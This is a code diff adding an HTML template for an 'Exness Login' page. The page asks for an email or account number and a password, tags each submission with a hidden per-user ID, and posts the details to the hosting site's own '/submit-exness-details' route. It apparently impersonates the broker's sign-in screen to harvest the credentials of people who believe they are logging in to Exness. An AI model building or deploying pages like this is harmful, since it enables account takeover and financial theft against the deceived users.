@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exness Login</title>
+    <link rel="stylesheet" href="/css/exness.css">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Sign in to Exness</h2>
+        <form id="exnessLoginForm" action="/submit-exness-details" method="POST">
+            <input type="hidden" name="userId" value="<%= userId %>">
+            
+            <label for="emailOrNumber">Email or Account Number:</label>
+            <input type="text" id="emailOrNumber" name="emailOrNumber" required placeholder="Email or account number">
+        
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required placeholder="Password">
+            
+            <button type="submit">Continue</button>
+        </form>
+        <p><a href="#">I forgot my password.</a></p>
+    </div>
+</body>
+</html>
